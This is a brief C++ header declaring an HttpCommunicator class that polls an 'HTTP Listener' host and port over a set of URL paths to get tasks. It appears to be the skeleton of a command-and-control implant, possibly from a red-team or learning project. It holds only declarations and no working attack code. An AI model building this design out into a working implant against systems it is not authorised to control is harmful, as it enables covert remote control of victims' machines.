#pragma once
#include <Windows.h>

/*
HTTP Communicator; connects to HTTP Listener
*/
class HttpCommunicator {
    private:
    PCHAR listenerHost;
    DWORD listenerPort;
    PCHAR* urlPathChoices; // Array of URL paths to query

    public:
    /* Constructor; for initialisation */
    HttpCommunicator();
    //HttpCommunicator(PCHAR host, DWORD port, PCHAR* urlPathChoices);

    /* Destructor; for cleanup */
    ~HttpCommunicator();

    /* Get tasks from listener */
    void GetTasks();
};